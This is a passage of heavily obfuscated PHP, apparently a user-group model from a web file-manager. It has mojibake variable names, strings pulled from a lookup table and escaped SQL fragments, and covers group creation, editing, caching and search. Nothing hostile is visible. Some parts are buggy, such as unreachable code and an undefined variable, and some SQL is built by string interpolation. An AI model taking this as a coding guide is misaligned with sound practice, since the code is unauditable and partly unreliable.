$this->getInfoSimple($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[202]]); if (!$‘èæäıƒ) { return !1; } } $É§ªáûâ = $ÎÛ÷àñ‚[604]; if ($‘èæäıƒ[$ÎÛ÷àñ‚[595]]) { $É§ªáûâ = $‘èæäıƒ[$ÎÛ÷àñ‚[595]] . $‘èæäıƒ[$ÎÛ÷àñ‚[1988]] . $ÎÛ÷àñ‚[50]; } $ûó„˙‘ = array($ÎÛ÷àñ‚[505] => $this->groupNameAuto($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[202]], $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[32]]), $ÎÛ÷àñ‚[488] => $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[202]], $ÎÛ÷àñ‚[666] => $É§ªáûâ, $ÎÛ÷àñ‚[2076] => $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1974]], $ÎÛ÷àñ‚[2077] => 0, $ÎÛ÷àñ‚[1992] => 0); if (isset($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2012]])) { $ûó„˙‘[$ÎÛ÷àñ‚[2012]] = $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2012]]; } else { $øÕúÜÛ˜ = $this->max($ÎÛ÷àñ‚[2012]); if (!$øÕúÜÛ˜) { $øÕúÜÛ˜ = 0; } $ûó„˙‘[$ÎÛ÷àñ‚[2012]] = $øÕúÜÛ˜ + 1; } if (!empty($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]])) { $ûó„˙‘[$ÎÛ÷àñ‚[1988]] = $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[1988]]; } $ø‘çÅ˜È = $this->add($ûó„˙‘); $this->setNamePinyin($ø‘çÅ˜È, $ûó„˙‘[$ÎÛ÷àñ‚[32]]); if (isset($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2078]])) { $this->metaSet($ø‘çÅ˜È, array($ÎÛ÷àñ‚[2078] => $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2078]], $ÎÛ÷àñ‚[2079] => $Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2079]])); unset($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2078]]); unset($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[2079]]); } Model($ÎÛ÷àñ‚[1436])->groupRootAdd($ø‘çÅ˜È); $this->_clearCache($Ÿ•ﬂöﬁÉ[$ÎÛ÷àñ‚[202]]); return $ø‘çÅ˜È; } protected function groupEdit($Õ”õÕÚ†, $é•ä∫ï¿) { $§çõÕèü =& $_SERVER[ˆë€Ï⁄∂]; $Œ˝Ù≠¬∑ = $this->getInfoSimple($Õ”õÕÚ†); if (!$Œ˝Ù≠¬∑) { return !1; } if (!empty($é•ä∫ï¿[$§çõÕèü[202]])) { $≤º¶äãô = $this->getInfoSimple($é•ä∫ï¿[$§çõÕèü[202]]); if (!$≤º¶äãô) { return !1; } if ($Œ˝Ù≠¬∑[$§çõÕèü[1988]] == $≤º¶äãô[$§çõÕèü[1988]]) { return !1; } if ($é•ä∫ï¿[$§çõÕèü[202]] != $Œ˝Ù≠¬∑[$§çõÕèü[202]]) { if ($≤º¶äãô[$§çõÕèü[595]] !== $Œ˝Ù≠¬∑[$§çõÕèü[595]] && strpos($≤º¶äãô[$§çõÕèü[595]], $Œ˝Ù≠¬∑[$§çõÕèü[595]] . $Œ˝Ù≠¬∑[$§çõÕèü[1988]] . $§çõÕèü[50]) === 0) { return !1; } $é•ä∫ï¿[$§çõÕèü[666]] = $≤º¶äãô[$§çõÕèü[595]] . $é•ä∫ï¿[$§çõÕèü[202]] . $§çõÕèü[50]; $this->_changeChildLevel($Œ˝Ù≠¬∑, $≤º¶äãô); $this->_clearCache($≤º¶äãô[$§çõÕèü[1988]]); $this->_clearCache($Œ˝Ù≠¬∑[$§çõÕèü[202]]); } } if (isset($é•ä∫ï¿[$§çõÕèü[32]])) { $this->setNamePinyin($Õ”õÕÚ†, $é•ä∫ï¿[$§çõÕèü[32]]); } if (isset($é•ä∫ï¿[$§çõÕèü[2078]])) { $this->metaSet($Õ”õÕÚ†, array($§çõÕèü[2078] => $é•ä∫ï¿[$§çõÕèü[2078]], $§çõÕèü[2079] => $é•ä∫ï¿[$§çõÕèü[2079]])); unset($é•ä∫ï¿[$§çõÕèü[2078]]); unset($é•ä∫ï¿[$§çõÕèü[2079]]); } $this->_clearChildrenCache($Œ˝Ù≠¬∑); return $this->where(array($§çõÕèü[2080] => $Õ”õÕÚ†))->save($é•ä∫ï¿); } private function _clearChildrenCache($ú›Ó…∆Ï) { $ë∆û·ˆÊ =& $_SERVER[ˆë€Ï⁄∂]; $´®öíçˆ = array($ë∆û·ˆÊ[666] => array($ë∆û·ˆÊ[626], $ú›Ó…∆Ï[$ë∆û·ˆÊ[595]] . $ú›Ó…∆Ï[$ë∆û·ˆÊ[1988]] . $ë∆û·ˆÊ[627])); $∆…Èºíá = $this->field($ë∆û·ˆÊ[1988])->where($´®öíçˆ)->select(); foreach ($∆…Èºíá as $Ÿ‹∆“Î—) { $this->_clearCache($Ÿ‹∆“Î—[$ë∆û·ˆÊ[1988]]); } } private function _clearCache($êÉÉÆÍÑ) { $Ω‹æºè– =& $_SERVER[ˆë€Ï⁄∂]; $this->cacheFunctionClear($Ω‹æºè–[2074], $êÉÉÆÍÑ); $this->cacheFunctionClear($Ω‹æºè–[2075], $êÉÉÆÍÑ); } private function _changeChildLevel($ÿìûË€Ÿ, $Æ˘â» Å, $◊æã≥–À = false) { $À˚ò´ª§ =& $_SERVER[ˆë€Ï⁄∂]; $£¸ù√Û± = $ÿìûË€Ÿ[$À˚ò´ª§[595]] . $ÿìûË€Ÿ[$À˚ò´ª§[1988]] . $À˚ò´ª§[50]; $«˜≥’ﬁ∫ = $Æ˘â» Å[$À˚ò´ª§[595]] . $Æ˘â» Å[$À˚ò´ª§[1988]] . $À˚ò´ª§[50] . $ÿìûË€Ÿ[$À˚ò´ª§[1988]] . $À˚ò´ª§[50]; if ($◊æã≥–À) { $«˜≥’ﬁ∫ = $Æ˘â» Å[$À˚ò´ª§[595]] . $Æ˘â» Å[$À˚ò´ª§[1988]] . $À˚ò´ª§[50]; } $˘ŸÃªÅƒ = array($À˚ò´ª§[666] => array($À˚ò´ª§[626], $ÿìûË€Ÿ[$À˚ò´ª§[595]] . $ÿìûË€Ÿ[$À˚ò´ª§[1988]] . $À˚ò´ª§[627])); $Ä¸˜ç°® = array($À˚ò´ª§[666] => array($À˚ò´ª§[675], "\x72\145\160\154\x61\143\145\x28\x70\x61\x72\x65\156\x74\114\x65\x76\145\154\54\47{$£¸ù√Û±}\x27\54\47{$«˜≥’ﬁ∫}\x27\x29")); $this->_clearChildrenCache($ÿìûË€Ÿ); $this->where($˘ŸÃªÅƒ)->data($Ä¸˜ç°®)->save(); } public function setNamePinyin($‡ÈÌ·´ï, $∏ÔÍ∞Ñ· = false) { $ŒíªüÖù =& $_SERVER[ˆë€Ï⁄∂]; if (!$∏ÔÍ∞Ñ·) { $‹ÇÉÒ˜º = $this->getInfoSimple($‡ÈÌ·´ï); $∏ÔÍ∞Ñ· = $‹ÇÉÒ˜º[$ŒíªüÖù[32]]; } if (!Input::check($∏ÔÍ∞Ñ·, $ŒíªüÖù[669])) { $this->metaSet($‡ÈÌ·´ï, $ŒíªüÖù[549], null); $this->metaSet($‡ÈÌ·´ï, $ŒíªüÖù[548], null); return; } $∑®Ò‡ÎÔ = array($ŒíªüÖù[549] => str_replace($ŒíªüÖù[53], $ŒíªüÖù[12], Pinyin::get($∏ÔÍ∞Ñ·)), $ŒíªüÖù[548] => Pinyin::get($∏ÔÍ∞Ñ·, $ŒíªüÖù[670])); $this->metaSet($‡ÈÌ·´ï, $∑®Ò‡ÎÔ); } protected function metaSet($®√Ò®ÿÒ, $‡Â∫ÌÉŒ = null, $Æí˛Âœ  = null) { $this->_clearCache($®√Ò®ÿÒ); return parent::metaSet($®√Ò®ÿÒ, $‡Â∫ÌÉŒ, $Æí˛Âœ ); } protected function groupStatus($ƒôŒ„Ï, $íÛÎˆ”∑) { $©Ì¥”¡ÿ =& $_SERVER[ˆë€Ï⁄∂]; $¡Æﬂ‘åì = $this->getInfoSimple($ƒôŒ„Ï); if (!$¡Æﬂ‘åì) { return !1; } $this->_clearCache($ƒôŒ„Ï); return $this->metaSet($ƒôŒ„Ï, $©Ì¥”¡ÿ[841], $íÛÎˆ”∑); if ($íÛÎˆ”∑ == $©Ì¥”¡ÿ[101]) { $ß–ƒﬁ∆Ü = $this->parentLevelArray($¡Æﬂ‘åì[$©Ì¥”¡ÿ[595]]); } else { } $ß–ƒﬁ∆Ü[] = $¡Æﬂ‘åì[$©Ì¥”¡ÿ[1988]]; $≠¨‹¥Á‹ = array(); foreach ($ß–ƒﬁ∆Ü as $ƒôŒ„Ï) { $≠¨‹¥Á‹[] = array($©Ì¥”¡ÿ[1988] => $ƒôŒ„Ï, $©Ì¥”¡ÿ[107] => $©Ì¥”¡ÿ[841], $©Ì¥”¡ÿ[461] => $íÛÎˆ”∑); $this->_clearCache($ƒôŒ„Ï); } return Model($©Ì¥”¡ÿ[2081])->addAll($≠¨‹¥Á‹, array(), !0); } protected function groupRemove($º¡Ö•‚π, $˜ı∑»∂€ = false) { $ïüÖ‘¢ª =& $_SERVER[ˆë€Ï⁄∂]; $á÷®™˝ê = array($ïüÖ‘¢ª[1988] => $º¡Ö•‚π); $ì´›º¢µ = $this->where($á÷®™˝ê)->find(); if (!$ì´›º¢µ || $ì´›º¢µ[$ïüÖ‘¢ª[202]] == 0) { return !1; } if (!$˜ı∑»∂€) { $¶Ÿ≤Ω¿Í = $this->getInfoSimple($ì´›º¢µ[$ïüÖ‘¢ª[202]]); $this->_changeChildLevel($ì´›º¢µ, $¶Ÿ≤Ω¿Í, !0); $this->where(array($ïüÖ‘¢ª[202] => $º¡Ö•‚π))->save(array($ïüÖ‘¢ª[202] => $ì´›º¢µ[$ïüÖ‘¢ª[202]])); $this->_clearCache($¶Ÿ≤Ω¿Í[$ïüÖ‘¢ª[1988]]); } Model($ïüÖ‘¢ª[2081])->where($á÷®™˝ê)->delete(); Model($ïüÖ‘¢ª[2082])->where($á÷®™˝ê)->delete(); Model($ïüÖ‘¢ª[916])->groupRootRemove($º¡Ö•‚π); $this->_clearCache($ì´›º¢µ[$ïüÖ‘¢ª[202]]); return $this->where($á÷®™˝ê)->delete(); } protected function groupSort($¡∑ﬁ∂¸) { $∞π«”ªõ =& $_SERVER[ˆë€Ï⁄∂]; $ÌÅ„∫Çó = array(); foreach ($¡∑ﬁ∂¸ as $”∆Ïı∂Ñ => $æè˝˚Ê›) { $ÌÅ„∫Çó[] = array($∞π«”ªõ[1988], $æè˝˚Ê›, $∞π«”ªõ[2012], $”∆Ïı∂Ñ + 1); } $this->saveAll($ÌÅ„∫Çó); } public function listData() { $ßÍõ†€Ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ßÍõ†€Ê[$_SERVER[ˆë€Ï⁄∂][456]]); return $ßÍõ†€Ê; } private function _makeOrder($“≥ÅØüä = '') { $ﬁø”¢˙… =& $_SERVER[ˆë€Ï⁄∂]; $÷Ïù·î” = array($ﬁø”¢˙…[1988], $ﬁø”¢˙…[32], $ﬁø”¢˙…[1976], $ﬁø”¢˙…[243]); $ÇÒÈ˙Í® = array($ﬁø”¢˙…[534] => $ﬁø”¢˙…[535], $ﬁø”¢˙…[536] => $ﬁø”¢˙…[537]); $¶˙ôû‚ÿ = Input::get($ﬁø”¢˙…[541], $ﬁø”¢˙…[7], $ﬁø”¢˙…[1992], $÷Ïù·î”); $·≈ñ◊›¶ = Input::get($ﬁø”¢˙…[542], $ﬁø”¢˙…[7], $ﬁø”¢˙…[2083], array($ﬁø”¢˙…[2083], $ﬁø”¢˙…[536])); $·≈ñ◊›¶ = $ÇÒÈ˙Í®[$·≈ñ◊›¶]; $“≥ÅØüä = $“≥ÅØüä . "{$¶˙ôû‚ÿ}\x20{$·≈ñ◊›¶}\54\40\147\162\x6f\x75\160\x49\104\40\x61\x73\x63"; return $this->order($“≥ÅØüä); } public function listChild($…ÌÑ˝ßø) { $Ú∫ô” ù =& $_SERVER[ˆë€Ï⁄∂]; $€ßıñ“· = $this->where(array($Ú∫ô” ù[202] => $…ÌÑ˝ßø))->_makeOrder()->selectPage(200); $this->_listDataApply($€ßıñ“·[$Ú∫ô” ù[456]]); return $€ßıñ“·; } public function listChildIds($àÀÏÙ·á) { $’Ç≠ƒ¬ú =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($ë·‚Â‰®)) { $àÀÏÙ·á = explode($’Ç≠ƒ¬ú[50], $àÀÏÙ·á); } $âÈΩ≈ìÅ = $this->where(array($’Ç≠ƒ¬ú[1988] => array($’Ç≠ƒ¬ú[7], $àÀÏÙ·á)))->field($’Ç≠ƒ¬ú[2084])->select(); if (!$âÈΩ≈ìÅ) { return !1; } $¨ï∏◊Æ˚ = array(); foreach ($âÈΩ≈ìÅ as $ê›»¥”‚) { $¨ï∏◊Æ˚[] = "\163\x65\x6c\x65\143\x74\x20\147\x72\x6f\165\160\111\x44\40\x66\162\157\x6d\40\140\x67\x72\157\x75\x70\140\40\167\150\145\x72\x65\40\x70\141\x72\145\156\x74\x4c\145\x76\x65\154\x20\154\151\x6b\145\40\x27{$ê›»¥”‚[$’Ç≠ƒ¬ú[595]]}{$ê›»¥”‚[$’Ç≠ƒ¬ú[1988]]}\x2c\x25\47"; } $¨ï∏◊Æ˚ = implode($’Ç≠ƒ¬ú[2085], $¨ï∏◊Æ˚); $âÈΩ≈ìÅ = $this->query($¨ï∏◊Æ˚); if (!$âÈΩ≈ìÅ) { return array(); } $àÀÏÙ·á = array_to_keyvalue($âÈΩ≈ìÅ, $’Ç≠ƒ¬ú[12], $’Ç≠ƒ¬ú[1988]); return array_unique($àÀÏÙ·á); } public function listByID($¡˛®÷òÒ) { $ø™ñ¢Ñ” =& $_SERVER[ˆë€Ï⁄∂]; if (!$¡˛®÷òÒ) { return array(); } $ÚÚ¡∆∞⁄ = array($ø™ñ¢Ñ”[1988] => array($ø™ñ¢Ñ”[7], $¡˛®÷òÒ)); $íî±àÉÇ = $this->where($ÚÚ¡∆∞⁄)->select(); $íî±àÉÇ = array_sort_keep($íî±àÉÇ, $ø™ñ¢Ñ”[1988], $¡˛®÷òÒ); $this->_listDataApply($íî±àÉÇ); return $íî±àÉÇ; } public function listSearch($ª§˛ä†Ø) { $∞∂µ≥¢é =& $_SERVER[ˆë€Ï⁄∂]; $‰ã®ÂÉ› = trim($ª§˛ä†Ø[$∞∂µ≥¢é[2086]]); $ßŸÙ€ˆ˜ = explode($∞∂µ≥¢é[53], $‰ã®ÂÉ›); if (!$‰ã®ÂÉ› || count($ßŸÙ€ˆ˜) == 1) { return $this->listSearchNow($ª§˛ä†Ø); } $«Ì≠≠€† = array($∞∂µ≥¢é[456] => array()); foreach ($ßŸÙ€ˆ˜ as $ ¿Ö¶⁄Ô) { if (!trim($ ¿Ö¶⁄Ô)) { continue; } $ª§˛ä†Ø[$∞∂µ≥¢é[2086]] = $ ¿Ö¶⁄Ô; $˚æÎª◊≠ = $this->listSearchNow($ª§˛ä†Ø); $«Ì≠≠€†[$∞∂µ≥¢é[456]] = array_merge($«Ì≠≠€†[$∞∂µ≥¢é[456]], $˚æÎª◊≠[$∞∂µ≥¢é[456]]); } $«Ì≠≠€†[$∞∂µ≥¢é[456]] = array_unique_by_key($«Ì≠≠€†[$∞∂µ≥¢é[456]], $∞∂µ≥¢é[1988]); $«Ì≠≠€†[$∞∂µ≥¢é[453]] = array($∞∂µ≥¢é[454] => count($«Ì≠≠€†[$∞∂µ≥¢é[456]]), $∞∂µ≥¢é[450] => 20, $∞∂µ≥¢é[439] => 1, $∞∂µ≥¢é[455] => 1); return $«Ì≠≠€†; } public function listSearchNow($ÕÍøñ‚›) { $ôÉàÌ‡Ã =& $_SERVER[ˆë€Ï⁄∂]; $ÚâﬂÂôÎ = trim($ÕÍøñ‚›[$ôÉàÌ‡Ã[2086]]); $˛Öìöï£ = isset($ÕÍøñ‚›[$ôÉàÌ‡Ã[2087]]) ? $ÕÍøñ‚›[$ôÉàÌ‡Ã[2087]] : !1; if (!trim($ÚâﬂÂôÎ)) { return !1; } $ÚâﬂÂôÎ = str_replace($ôÉàÌ‡Ã[2088], $ôÉàÌ‡Ã[2089], $ÚâﬂÂôÎ); $•‡‚Œ‚ì = array($ôÉàÌ‡Ã[1988] => array($ôÉàÌ‡Ã[470], "{$ÚâﬂÂôÎ}\x25"), $ôÉàÌ‡Ã[32] => array($ôÉàÌ‡Ã[470], "\45{$ÚâﬂÂôÎ}\45"), $ôÉàÌ‡Ã[1092] => $ôÉàÌ‡Ã[2090]); if ($˛Öìöï£) { $ìíπ™ı˛ = $this->getInfoSimple($˛Öìöï£); $˘≤»Ãòø = $ìíπ™ı˛[$ôÉàÌ‡Ã[595]] . $˛Öìöï£ . $ôÉàÌ‡Ã[627]; $•‡‚Œ‚ì = array($•‡‚Œ‚ì, array($ôÉàÌ‡Ã[595] => array($ôÉàÌ‡Ã[470], $˘≤»Ãòø))); } $•‡‚Œ‚ì = $this->parseWhereLike($•‡‚Œ‚ì); $ù˛Ù‚∏Í = $this->_makeOrder()->where($•‡‚Œ‚ì)->selectPage(20); $ù˛Ù‚∏Í = $ù˛Ù‚∏Í ? $ù˛Ù‚∏Í : array($ôÉàÌ‡Ã[456] => array(), $ôÉàÌ‡Ã[453] => array()); if (!$ù˛Ù‚∏Í || count($ù˛Ù‚∏Í[$ôÉàÌ‡Ã[456]]) < 5 && Input::check($ÚâﬂÂôÎ, $ôÉàÌ‡Ã[404])) { $‡Åé¶‰ü = $this->groupChildrenAll($˛Öìöï£); $Êü’îª€ = $this->_searchFromMeta($ôÉàÌ‡Ã[548], $ÚâﬂÂôÎ, 10, $‡Åé¶‰ü); $ÍﬂàÙ˝“ = $this->_searchFromMeta($ôÉàÌ‡Ã[549], $ÚâﬂÂôÎ, 10, $‡Åé¶‰ü); $·±ÎíÇ¯ = array_merge($Êü’îª€, $ÍﬂàÙ˝“, $ù˛Ù‚∏Í[$ôÉàÌ‡Ã[456]]); $ù˛Ù‚∏Í[$ôÉàÌ‡Ã[456]] = array_unique_by_key($·±ÎíÇ¯, $ôÉàÌ‡Ã[1988]); $ù˛Ù‚∏Í[$ôÉàÌ‡Ã[453]][$ôÉàÌ‡Ã[454]] = count($ù˛Ù‚∏Í[$ôÉàÌ‡Ã[456]]); $ù˛Ù‚∏Í[$ôÉàÌ‡Ã[453]][$ôÉàÌ‡Ã[455]] = ceil($ù˛Ù‚∏Í[$ôÉàÌ‡Ã[453]][$ôÉàÌ‡Ã[454]] / $ù˛Ù‚∏Í[$ôÉàÌ‡Ã[453]][$ôÉàÌ‡Ã[450]]); } $this->_listDataApply($ù˛Ù‚∏Í[$ôÉàÌ‡Ã[456]]); return $ù˛Ù‚∏Í; } protected function groupChildrenAll($êîÆŸàì) { $áºí•√≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!$êîÆŸàì) { return !1; } if (!is_array($êîÆŸàì)) { $êîÆŸàì = array($êîÆŸàì); } $∫‚Åä— = $êîÆŸàì; foreach ($êîÆŸàì as $ßΩ¢¿≤¥) { $Ù˚ıè◊¬ = $this->getInfoSimple($ßΩ¢¿≤¥); $ªëË™Ãπ = array($áºí•√≥[595] => array($áºí•√≥[470], $Ù˚ıè◊¬[$áºí•√≥[595]] . $ßΩ¢¿≤¥ . $áºí•√≥[627])); $∞»Áµ ú = $this->field($áºí•√≥[1988])->where($ªëË™Ãπ)->select(); $∫‚Åä— = array_merge($∫‚Åä—, array_to_keyvalue($∞»Áµ ú, $áºí•√≥[12], $áºí•√≥[1988])); } return array_unique($∫‚Åä—); } private function _searchFromMeta($©ú¸ùñ√, $÷÷õÊâ¬, $ã±ﬁÊè¡, $¡ƒà‚Í¥) { $◊¸ê∑Ω© =& $_SERVER[ˆë€Ï⁄∂]; $÷÷õÊâ¬ = strtolower($÷÷õÊâ¬); $°åòÑ¶î = array($◊¸ê∑Ω©[107] => $©ú¸ùñ√, $◊¸ê∑Ω©[461] => array($◊¸ê∑Ω©[470], "\x25{$÷÷õÊâ¬}\45")); $°åòÑ¶î = $this->parseWhereLike($°åòÑ¶î); if ($¡ƒà‚Í¥) { $°åòÑ¶î[$◊¸ê∑Ω©[1988]] = array($◊¸ê∑Ω©[7], $¡ƒà‚Í¥); } $€ÂÊãË = Model($◊¸ê∑Ω©[2091])->where($°åòÑ¶î)->limit($ã±ﬁÊè¡)->select(); if (!$€ÂÊãË) { return array(); } $€ÂÊãË = array_to_keyvalue($€ÂÊãË, $◊¸ê∑Ω©[12], $◊¸ê∑Ω©[1988]); $äÔ≠¨÷£ = $this->where(array($◊¸ê∑Ω©[2080] => array($◊¸ê∑Ω©[7], $€ÂÊãË)))->select(); if (!$äÔ≠¨÷£) { return array(); } return $äÔ≠¨÷£; } protected function _listDataApplyItem($üÔ≤¬‡ì) { $±Ôå≥º≤ = array($üÔ≤¬‡ì); $this->_listDataApply($±Ôå≥º≤); return $±Ôå≥º≤[0]; } protected function _listDataApply(&$ïÌ∑Äÿ•) { $»Éáí˜î =& $_SERVER[ˆë€Ï⁄∂]; if (!$ïÌ∑Äÿ•) { return; } $◊îæœàÿ = array_to_keyvalue($ïÌ∑Äÿ•, $»Éáí˜î[12], $»Éáí˜î[1988]); $this->_listAppendChildren($ïÌ∑Äÿ•); $this->_listAppendChildrenMember($ïÌ∑Äÿ•); $this->_listAppendMeta($ïÌ∑Äÿ•, $◊îæœàÿ); $this->_listAppendParent($ïÌ∑Äÿ•); $this->_listAppendSourceRoot($ïÌ∑Äÿ•, $◊îæœàÿ); } private function _listAppendChildren(&$êÁÆ∂Ë¬) { $ËéôØ∏Å =& $_SERVER[ˆë€Ï⁄∂]; $Ó˛ÓôÇ = array_to_keyvalue($êÁÆ∂Ë¬, $ËéôØ∏Å[12], $ËéôØ∏Å[1988]); $€•·Ù‹ = array($ËéôØ∏Å[202] => array($ËéôØ∏Å[7], $Ó˛ÓôÇ)); $•≤«∏œ≠ = array($ËéôØ∏Å[202], $ËéôØ∏Å[2092] => $ËéôØ∏Å[576]); $Å•Éùÿ· = $this->field($•≤«∏œ≠)->where($€•·Ù‹)->group($ËéôØ∏Å[202])->select(); $π¶ı≤‰˚ = array_to_keyvalue($Å•Éùÿ·, $ËéôØ∏Å[202], $ËéôØ∏Å[576]); foreach ($êÁÆ∂Ë¬ as &$≤ï°ÀÉÆ) { $ìà∞ÌØƒ = $≤ï°ÀÉÆ[$ËéôØ∏Å[1988]]; $≤ï°ÀÉÆ[$ËéôØ∏Å[2093]] = isset($π¶ı≤‰˚[$ìà∞ÌØƒ]) ? intval($π¶ı≤‰˚[$ìà∞ÌØƒ]) : !1; } unset($≤ï°ÀÉÆ); } private function _listAppendChildrenMember(&$¬∏ú “Ã) { $ÌéÈ◊Ò¥ =& $_SERVER[ˆë€Ï⁄∂]; $ªÕ⁄òõÈ = array_to_keyvalue($¬∏ú “Ã, $ÌéÈ◊Ò¥[12], $ÌéÈ◊Ò¥[1988]); $ç∫ìñ±„ = array($ÌéÈ◊Ò¥[1988] => array($ÌéÈ◊Ò¥[7], $ªÕ⁄òõÈ)); $…ôø≠˙… = array($ÌéÈ◊Ò¥[1988], $ÌéÈ◊Ò¥[2092] => $ÌéÈ◊Ò¥[576]); $ã€˝≤‰≥ = Model($ÌéÈ◊Ò¥[2082])->field($…ôø≠˙…)->where($ç∫ìñ±„)->group($ÌéÈ◊Ò¥[1988])->select(); $˝…Ù£»Ä = array_to_keyvalue($ã€˝≤‰≥, $ÌéÈ◊Ò¥[1988], $ÌéÈ◊Ò¥[576]); foreach ($¬∏ú “Ã as &$Ò§∆¸Òù) { $¨ƒ´›ÔÜ = $Ò§∆¸Òù[$ÌéÈ◊Ò¥[1988]]; $Ò§∆¸Òù[$ÌéÈ◊Ò¥[2094]] = isset($˝…Ù£»Ä[$¨ƒ´›ÔÜ]) ? intval($˝…Ù£»Ä[$¨ƒ´›ÔÜ]) : !1; } unset($Ò§∆¸Òù); } private function _listAppendMeta(&$º◊≈ƒèï, $√—ó°Ó¯) { $ø”Ù’‚∑ =& $_SERVER[ˆë€Ï⁄∂]; $Ò©≈éÓÂ = array($ø”Ù’‚∑[1988] => array($ø”Ù’‚∑[7], $√—ó°Ó¯)); $’€ƒ°ãı = Model($ø”Ù’‚∑[2081])->where($Ò©≈éÓÂ)->select(); $’€ƒ°ãı = array_to_keyvalue_group($’€ƒ°ãı, $ø”Ù’‚∑[1988]); foreach ($’€ƒ°ãı as &$ù˝÷àìÒ) { $ù˝÷àìÒ = array_to_keyvalue($ù˝÷àìÒ, $ø”Ù’‚∑[107], $ø”Ù’‚∑[461]); } unset($ù˝÷àìÒ); foreach ($º◊≈ƒèï as &$Àî‹°Ùä) { $Àî‹°Ùä[$ø”Ù’‚∑[550]] = array(); if (isset($’€ƒ°ãı[$Àî‹°Ùä[$ø”Ù’‚∑[1988]]])) { $Àî‹°Ùä[$ø”Ù’‚∑[550]] = $’€ƒ°ãı[$Àî‹°Ùä[$ø”Ù’‚∑[1988]]]; } } unset($Àî‹°Ùä); } protected function parentLevelArray($ˆÉßÇòÁ) { $‰≥ëı¬˘ =& $_SERVER[ˆë€Ï⁄∂]; $ˆÉßÇòÁ = explode($‰≥ëı¬˘[50], trim($ˆÉßÇòÁ, $‰≥ëı¬˘[50])); $ˆÉßÇòÁ = array_remove_value($ˆÉßÇòÁ, $‰≥ëı¬˘[240]); return $ˆÉßÇòÁ; } protected function parentInGroup($√Ú’∑Ìﬁ, $œ§“ËÙÎ) { $–ÚÉ ’“ =& $_SERVER[ˆë€Ï⁄∂]; $∑‚øó∑≠ = $this->getInfoSimple($√Ú’∑Ìﬁ); if (!$∑‚øó∑≠) { return !0; } $…Ê√¸æñ = $this->parentLevelArray($∑‚øó∑≠[$–ÚÉ ’“[595]]); $…Ê√¸æñ[] = $√Ú’∑Ìﬁ; foreach ($…Ê√¸æñ as $√Ú’∑Ìﬁ) { if (in_array($√Ú’∑Ìﬁ . $–ÚÉ ’“[12], $œ§“ËÙÎ)) { return !0; } } return !1; } private function _listAppendParent(&$˛¡õÇ†Ì) { $œûüñÂÅ =& $_SERVER[ˆë€Ï⁄∂]; $∞∫ë‚◊» = array(); foreach ($˛¡õÇ†Ì as &$”ÿÙè„) { $∞∫ë‚◊»[$”ÿÙè„[$œûüñÂÅ[1988]]] = $”ÿÙè„[$œûüñÂÅ[32]]; $ø¨¢≥Ç» = $this->parentLevelArray($”ÿÙè„[$œûüñÂÅ[595]]); foreach ($ø¨¢≥Ç» as $‹õ∫Ûùî) { if (!isset($∞∫ë‚◊»[$‹õ∫Ûùî])) { $∞∫ë‚◊»[$‹õ∫Ûùî] = 0; } } } unset($”ÿÙè„); foreach ($∞∫ë‚◊» as $≠Œ†√Ö’ => $§“´‚≤¸) { if ($§“´‚≤¸) { continue; } $»˛µ≠¨À = $this->getInfoSimple($≠Œ†√Ö’); $∞∫ë‚◊»[$≠Œ†√Ö’] = $»˛µ≠¨À[$œûüñÂÅ[32]]; } $”¸ò“´ü = $GLOBALS[$œûüñÂÅ[6]][$œûüñÂÅ[102]][$œûüñÂÅ[2095]]; if (KodUser::isRoot()) { $”¸ò“´ü = !1; } foreach ($˛¡õÇ†Ì as &$”ÿÙè„) { $ø¨¢≥Ç» = $this->parentLevelArray($”ÿÙè„[$œûüñÂÅ[595]]); $ÇŸó¸∞ÿ = $œûüñÂÅ[12]; foreach ($ø¨¢≥Ç» as $≠Œ†√Ö’ => $‹õ∫Ûùî) { if ($”¸ò“´ü && $≠Œ†√Ö’ == 0) { continue; } $ÇŸó¸∞ÿ .= $∞∫ë‚◊»[$‹õ∫Ûùî] . $œûüñÂÅ[8]; } if ($ø¨¢≥Ç») { $ÇŸó¸∞ÿ .= $”ÿÙè„[$œûüñÂÅ[32]]; } $”ÿÙè„[$œûüñÂÅ[600]] = str_replace($œûüñÂÅ[266], $œûüñÂÅ[8], $ÇŸó¸∞ÿ); } unset($”ÿÙè„); } private function _listAppendSourceRoot(&$ß∏ÎˆŒ„, $… ≤´˜Å) { $ïΩäÅÛÂ =& $_SERVER[ˆë€Ï⁄∂]; $‰àÁÂª£ = Model($ïΩäÅÛÂ[916])->listSourceRoot(SourceModel::TYPE_GROUP, $… ≤´˜Å); $‰àÁÂª£ = array_to_keyvalue($‰àÁÂª£, $ïΩäÅÛÂ[580]); $‰àÁÂª£ = array_remove_key($‰àÁÂª£, $ïΩäÅÛÂ[580]); foreach ($ß∏ÎˆŒ„ as &$’©´≈‹≤) { $’©´≈‹≤[$ïΩäÅÛÂ[100]] = $‰àÁÂª£[$’©´≈‹≤[$ïΩäÅÛÂ[1988]]] ? $‰àÁÂª£[$’©´≈‹≤[$ïΩäÅÛÂ[1988]]] : array(); } unset($’©´≈‹≤); } protected function groupMerge($ÎÖ¿—¶›) { $ÎÖ¿—¶› = array_values(array_unique($ÎÖ¿—¶›)); $≠ˆî‘ñ˛ = array(); for ($ã¡¢·˜è = 0; $ã¡¢·˜è < count($ÎÖ¿—¶›); $ã¡¢·˜è++) { $≈äıÚ⁄Ó = !1; for ($û˜«‡€‘ = 0; $û˜«‡€‘ < count($ÎÖ¿—¶›); $û˜«‡€‘++) { if ($ã¡¢·˜è == $û˜«‡€‘) { continue; } if ($this->isParentOf($ÎÖ¿—¶›[$û˜«‡€‘], $ÎÖ¿—¶›[$ã¡¢·˜è])) { $≈äıÚ⁄Ó = !0; break; 